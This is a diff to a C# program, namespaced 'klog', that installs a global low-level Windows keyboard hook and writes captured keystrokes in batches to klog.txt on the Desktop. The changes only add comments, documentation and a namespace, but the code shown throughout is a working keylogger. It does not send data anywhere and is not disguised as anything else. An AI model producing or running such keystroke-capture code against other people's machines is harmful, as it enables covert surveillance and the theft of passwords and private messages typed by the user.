@@ -2,20 +2,24 @@
 using Windows.Win32.UI.WindowsAndMessaging;
 using Windows.Win32.Foundation;
 
+namespace klog;
+
 #pragma warning disable CA1416
-public class Program
+public static class Program
 {
-    private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
     private static readonly List<string> Buffer = new();
+    private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static StreamWriter _writer = new(PathToFile);
     private const uint BufferSize = 10;
 
     public static unsafe void Main()
     {
+        // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
             WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
         
+        // set up message queue
         MSG msg = new();
         while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
         {
@@ -23,6 +27,7 @@ public class Program
             PInvoke.DispatchMessage(msg);
         }
         
+        // clean disposable things up
         _kbHook.Close();
         _writer.Flush();
         _writer.Dispose();
@@ -32,6 +37,8 @@ public class Program
     {
         var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
         
+        // checking for events other than keydown
+        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
         if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
             return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
 
@@ -189,6 +196,11 @@ public class Program
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
 
+    /// <summary>
+    /// Adds a string to the <see cref="Buffer"/> and writes the <see cref="Buffer"/> to file if
+    /// <see cref="BufferSize"/> has been reached.
+    /// </summary>
+    /// <param name="stringToWrite">String to add to buffer</param>
     private static async void WriteToFile(string stringToWrite)
     {
         if (Buffer.Count >= BufferSize)
@@ -214,6 +226,9 @@ public class Program
         Buffer.Add(stringToWrite);
     }
 
+    /// <summary>
+    /// Writes buffer to file using the <see cref="_writer">_writer object</see>
+    /// </summary>
     private static async Task WriteBuffer()
     {
         foreach (var str in Buffer)
